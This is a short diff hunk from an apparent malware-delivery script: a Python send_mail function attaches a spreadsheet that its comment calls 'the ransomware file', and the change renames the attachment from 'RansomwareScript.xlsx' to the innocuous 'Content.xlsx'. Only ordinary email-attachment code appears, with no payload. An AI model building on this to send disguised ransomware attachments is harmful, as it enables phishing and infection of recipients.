@@ -21,7 +21,7 @@ def send_mail(send_from,send_to,subject,text,username,password):
     #create application Payload
     part = MIMEBase('application', "octet-stream")
     #specify location of the ransomware file and put it into part
-    part.set_payload(open("RansomwareScript.xlsx", "rb").read())
+    part.set_payload(open("Content.xlsx", "rb").read())
     #encode this shit
     encoders.encode_base64(part)
     #repeat the name of the attachment as header
